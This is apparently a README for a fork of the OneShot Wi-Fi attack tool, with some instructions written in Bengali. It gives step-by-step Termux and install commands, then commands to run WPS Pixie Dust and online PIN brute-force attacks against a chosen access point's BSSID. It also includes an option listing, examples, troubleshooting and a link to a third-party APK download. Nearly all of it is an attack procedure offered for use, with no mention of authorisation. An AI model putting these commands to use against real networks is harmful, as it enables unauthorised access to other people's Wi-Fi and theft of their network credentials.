# Setup
```
pkg update && pkg upgrade -y
pkg install git -y
pkg install python -y
git clone https://github.com/ALAMIN-2K07/WIFI-HACK
cd WIFI-HACK
ls
chmod +x oneshot.py
ls
bash installer.sh
```
```
cd WIFI-HACK
```
```
ls
```
```
sudo python oneshot.py -i wlan0 -K
```

## [Brute Force]
```
cd WIFI-HACK
```
```
ls
```
```
sudo python oneshot.py -i wlan0 -K
```
এখন আমরা BSSID কপি করব, যা দেখতে কিছুটা MAC অ্যাড্রেসের মতো হবে। Example: B4:0F:3B:57:F0:90 -B

তারপর আমরা Ctrl + C চাপব, এতে টুলটি বন্ধ হয়ে যাবে।

তারপর আমরা ```cd```কমান্ড দিয়ে হোম ডিরেক্টরিতে চলে যাব।
```
cd WIFI-HACK
```
```
sudo python oneshot.py -i wlan0 -b (BSSID) -B
```

## [Termux](https://termux.com/)
Please note that root access is required.  
#### Download BusyBox....https://github.com/W8SOJIB/W8RootWifiHK/raw/main/BusyBox%20Free_64.apk

# Usage
```
 oneshot.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 oneshot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 oneshot.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements

